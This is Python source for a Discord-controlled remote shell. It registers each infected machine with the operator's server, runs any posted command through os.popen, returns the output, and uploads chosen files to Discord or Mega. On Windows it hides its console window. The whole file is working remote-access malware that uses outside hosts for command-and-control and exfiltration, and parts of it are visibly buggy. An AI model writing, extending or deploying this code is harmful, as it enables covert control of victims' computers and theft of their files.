import config
import discord
from discord.ext import commands
import io
from mega import Mega
import os
import platform
import subprocess
import sys


TEXT_SIZE_MAX = 1992
CHUNKED_TEXT_SIZE_MAX = TEXT_SIZE_MAX * 4
TEXT_CHUNK_SIZE = TEXT_SIZE_MAX

FILE_SIZE_MAX = 7864320
CHUNKED_FILE_SIZE_MAX = 4 * FILE_SIZE_MAX
MEGA_SIZE_MAX = 110100480


bot = commands.Bot(command_prefix=".")
channel = None


@bot.event
async def on_ready():
    global channel

    # Get server name
    guild = bot.get_guild(server_id)

    # Create 'SierraOne' category
    category = await create_category(guild)

    # Get a list of the text channels in the server
    channels = guild.text_channels    

    # Create 'sierra-hotel-'
    channel = await create_channel(category, channels)

    # Get the machine info
    info = await machine_info()

    # Send the machine info to 'sierra-hotel-'
    # Remove 'embed=info' if you want to use the alternative
    send_info = await channel.send(embed=info)

    # Pin the machine info to 'sierra-hotel-'
    await send_info.pin()

    if config.mega_email == "" and config.mega_password == "":
        await channel.send(
        "**WARNING**\nMega credentials were not found. All your uploads larger than 7.5 MB"
        "will be split into chunks and uploaded over Discord."
        )

    else:
        await channel.send("Mega credentials found. All your uploads larger than 7.5 MB will be uploaded to Mega.")

# Create 'SierraOne' category
async def create_category(guild):
    category = discord.utils.get(guild.categories, name=category_prefix)
    if not category:
        category = await guild.create_category(category_prefix)
    return category


# Create 'sierra-hotel-'
async def create_channel(category, channels):
    shell_number = await next_channel(channels)

    return await category.create_text_channel(channel_prefix + str(shell_number))


# Number 'sierra-hotel-'
async def next_channel(channels):
    numbers = []
    shell_number = 0

    try:
        for channel in channels:
            name = channel.name
            if channel_prefix in name:
                channel_number = name.split("-")[2]
                if channel_number.isdigit():
                    numbers.append(int(channel_number))
        shell_number = max(numbers) + 1

    except ValueError:
        shell_number = shell_number + 1

    return shell_number


# Get the machine info
async def machine_info():
    #Fix possible unbound
    machine_UUID = ""

    if platform.system() == "Windows":
        get_UUID = str(subprocess.check_output("wmic csproduct get UUID").decode().strip())
        for line in get_UUID:
            UUID = " ".join(get_UUID.split())
            machine_UUID = UUID[5:]
    elif platform.system() == "Linux":
        machine_UUID = str(subprocess.check_output(["cat", "/etc/machine-id"]).decode().strip())
    elif platform.system() == "Darwin":
        machine_UUID = str(
            subprocess.check_output(
                [
                    "ioreg",
                    "-d2",
                    "-c",
                    "IOPlatformExpertDevice",
                    "|",
                    "awk",
                    "-F",
                    "'/IOPlatformUUID/{print $(NF-1)}'"
                ]
            )
        )
    
    else:
        machine_UUID = str("Unknown")

    message = discord.Embed(title="Machine Info", type="rich")
    message.add_field(name="Operating System", value=platform.system())
    message.add_field(name="UUID", value=machine_UUID)

    # Non-embed alternative
    # message = f"`{platform.system()}` with the `{machine_UUID}` UUID connected."
    return message


@bot.event
async def on_message(message):
    if message.author.id != bot.user.id:
        await shell_input(message)

#Helper function for upload, uploads given file name to Mega
async def mega_upload(filename):
    await channel.send("Uploading {} to Mega, standby,...".format(filename))
    mega_upload = mega_nz.upload(filename)
    mega_link = mega_nz.get_upload_link(mega_upload)
    await channel.send("Mega link of uploaded file: {}".format(mega_link))

#Uploads given file in chunks, the file size should be checked before the function call
async def upload_chunks(filename):
    await channel.send("Splitting your file and uploading the parts, standby...")

    with open(filename, "rb") as fd:
        chunk = fd.read(FILE_SIZE_MAX)
        
        i = 1
        while chunk:
            uploadname = "{}-{}".format(filename, i)

            await channel.send(
                "Uploading {}th part of the file as {}, standby...".format(i, uploadname)
            )
            await channel.send(
                file = discord.File(io.BytesIO(chunk), filename = uploadname)
            )

            chunk = fd.read(FILE_SIZE_MAX)
            i += 1

async def upload(filename):
    hasMegaKey = config.mega_email != "" and config.mega_password != ""
    filesize = 0

    try:
        filesize = os.path.getsize(filename)
    except FileNotFoundError:
        await channel.send("File not found")
        return

    #If user has Mega key, and filesize is less then MEGA_SIZE_MAX,
    #then upload file to Mega
    if hasMegaKey and filesize <= MEGA_SIZE_MAX and filesize > FILE_SIZE_MAX:
        await mega_upload(filename)
    else:
        if filesize <= FILE_SIZE_MAX:
            await channel.send("Uploading {}, standby...".format(filename))
            await channel.send(file=discord.File(filename))
        #If filesize is bigger then 7.5 MiB, and less then or equal to 4*(7.5 MiB)
        #upload file chunk by chunk (max 4 chunks)
        elif FILE_SIZE_MAX < filesize <= CHUNKED_FILE_SIZE_MAX:
            await upload_chunks(filename)
        else:
            await channel.send("File is too big")

async def upload_chunks_from_memory(data):
    await channel.send("Splitting output and uploading chunks as files, standby...")

    data = [data[i:i + FILE_SIZE_MAX] for i in range(0, len(data), FILE_SIZE_MAX)]
    i = 1
    for chunk in data:
        uploadname = "output-{}.txt".format(i)

        await channel.send(
            "Uploading {}th part of the output as {}, standby".format(i, uploadname)
        )
        await channel.send(
            file = discord.File(io.BytesIO(chunk), filename = uploadname)
        )

async def upload_from_memory(data, n):
    if n <= FILE_SIZE_MAX:

        filename = "output.txt"
        await channel.send(
            file = discord.File(io.BytesIO(data), filename = filename)
        )
    elif n <= CHUNKED_FILE_SIZE_MAX:
        await upload_chunks_from_memory(data)

async def handle_user_input(content):
    user_input = ""

    try:
        user_input = os.popen(content).read()
    except:
        await channel.send("Error reading command output.")
        return

    if user_input == "":
        await channel.send("The command did not return anything")
        return

    paginator = discord.ext.commands.Paginator(prefix="```", suffix="```")

    output_length = len(user_input)

    if '`' in user_input:
        await channel.send("Output contains illegal character. Output will be sent as file.")
        await upload_from_memory(user_input.encode("utf-8", "ignore"), output_length)
        return


    if 0 < output_length <= CHUNKED_TEXT_SIZE_MAX:
        user_input = [user_input[i:i+TEXT_SIZE_MAX] for i in range(0, len(user_input), TEXT_SIZE_MAX)]

        for page in user_input:
            paginator.add_line(page)

        for page in paginator.pages:
            await channel.send("{}".format(page))
    elif CHUNKED_TEXT_SIZE_MAX < output_length <= CHUNKED_FILE_SIZE_MAX:
        await channel.send("Output is too large. Will be send as file: {}".format(filename))
        await upload_from_memory(user_input.encode("utf-8", "ignore"), output_length)
    elif output_length > CHUNKED_FILE_SIZE_MAX:
        await channel.send("Output size is too big. If you are trying to read a file, try uploading it.")
    else:
        await channel.send("Unknown error.")

async def shell_input(message):
    # Checks if the message was sent to 'sierra-hotel-'
    if message.channel != channel:
        return

    # Check if the message content starts with "upload"
    if message.content.startswith("upload"):
        await upload(message.content.split(" ")[1])
    elif message.content.startswith("cd"):
        # Change directories
        os.chdir(message.content.split(" ")[1])

        # Notify the user of the directory change
        await channel.send("`cd` complete")

    # Check if the message content starts with "shell_exit"
    elif message.content.startswith("shell_exit"):
        # Delete the room that the command was invoked in
        await channel.delete()

        # Close the shell
        sys.exit(0)

    else:
        await handle_user_input(message.content)

if platform.system() == "Windows":
    import ctypes
    import pywintypes
    import win32process

    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
    if hwnd != 0:
        ctypes.windll.user32.ShowWindow(hwnd, 0)
        ctypes.windll.kernel32.CloseHandle(hwnd)
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
        os.system(f"taskkill /PID {pid} /f")

# Server ID
server_id = config.server_id

# Category prefix
category_prefix = config.category_prefix

# Channel prefix
channel_prefix = config.channel_prefix

if config.mega_email != "" and config.mega_password != "":
    mega = Mega()
    mega_nz = mega.login(config.mega_email, config.mega_password)

bot.run(config.bot_token)
